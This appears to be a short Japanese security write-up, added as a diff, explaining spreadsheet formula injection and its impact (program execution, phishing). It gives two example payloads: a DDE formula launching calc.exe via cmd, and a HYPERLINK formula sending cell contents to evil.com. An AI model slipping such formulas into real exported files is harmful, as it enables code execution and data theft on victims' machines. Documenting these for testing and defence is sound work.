@@ -1,0 +1,32 @@
+#+TITLE: Formula Injection
+
+* Formula Injection
+** 概要
+Command Injection種類の一つであるFormula Injection が可能です。
+
+
+次のような攻撃ペイロードが私用されます。
+
+#+BEGIN_SRC bash
+=cmd|'/Ccalc.exe'!z
+=HYPERLINK(“http://evil.com?x=”&A3&”,”&B3&”[CR]”,”Error fetching info: Click me to resolve.”)
+#+END_SRC
+
+
+** Security Impact
+- 被害者PCのプログラムが実行されます。
+- 被害者を悪質なサイトに誘導することができます。（フィッシング詐欺、ドライブバイダウンロード攻撃などの追加被害が発生する可能性があります。）
+
+
+** Ref
+https://pentestmag.com/formula-injection/
+
+
+
+
+
+
+
+
+
+
